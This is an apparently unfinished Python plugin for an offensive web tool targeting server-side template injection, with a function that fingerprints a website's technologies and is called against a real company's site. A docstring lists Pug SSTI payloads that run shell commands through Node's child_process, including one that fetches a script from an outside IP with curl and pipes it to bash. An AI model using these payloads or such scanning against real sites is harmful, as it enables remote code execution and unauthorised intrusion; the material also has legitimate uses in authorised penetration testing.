#!/usr/bin/python3
# coding: utf-8
# Server Side Template Injection
# Plugin for D0M3Y
# By V3R

#TODO:
# ADD this plds
#PUG SSTI
# DOCS: https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/
#https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

"""
#{7*7} = 49
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}
"""

import requests
import time
from bs4 import BeautifulSoup
import sys,os
import builtwith


# load all the python ssti payloads
def LoadSsti():
	pass

# Detect the use language
# Java / Python-Flask / Angular ...
def detect_language(url):
	website = builtwith.parse(url)
	try:
		language = website['programming-languages']

		# in case of python 
		if "Python" in language: 
			print("Using Python") 
		elif "Django" in language: 
			print("Using Django") 
		elif "Flask" in language: 
			print("Using Flask")
			
		print(" ".join(language))
		

	except KeyError:
		print("[!] Not programming-languages found")
		print("[!] Try Manually")

	ask = input("[+] Do You Wanna See All (Y/N): ")
	if ask == "Y" or ask == "y":
		for key,value in website.items():
			print(key + ":",", ".join(value))
	else:
		exit(0)

detect_language("https://www.gojek.com/en-id/")
